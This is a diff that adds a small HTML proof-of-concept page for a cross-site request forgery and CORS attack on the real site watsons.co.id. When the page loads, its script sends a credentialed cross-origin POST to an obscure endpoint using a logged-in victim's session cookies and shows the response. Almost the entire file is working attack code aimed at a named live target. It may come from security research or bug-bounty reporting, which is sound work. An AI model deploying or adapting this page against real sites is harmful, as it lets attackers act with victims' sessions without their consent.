@@ -1,0 +1,29 @@
+<!DOCTYPE html>
+<html>
+<head>
+  <title>CSRF CORS PoC - Watsons</title>
+</head>
+<body>
+  <h1>PoC Executing... 🔥</h1>
+  <p>If the victim is logged into <code>watsons.co.id</code>, this will send a cross-origin POST request with their session cookies.</p>
+
+  <script>
+    fetch("https://www.watsons.co.id/x0JcYp/2gyce/XlJDj/Mh46/JukOLpDkVfkG5b/QkJWAQ/XzknSC/soPVAB", {
+      method: "POST",
+      headers: {
+        "Content-Type": "text/plain;charset=UTF-8"
+      },
+      body: "test=exploit_from_evil_origin",
+      credentials: "include" // 🔥 sends victim's cookies
+    })
+    .then(response => response.text())
+    .then(data => {
+      console.log("Response:", data);
+      document.body.innerHTML += `<pre>✅ Exploit sent!\nResponse:\n${data}</pre>`;
+    })
+    .catch(err => {
+      document.body.innerHTML += `<pre>❌ Exploit failed:\n${err}</pre>`;
+    });
+  </script>
+</body>
+</html>
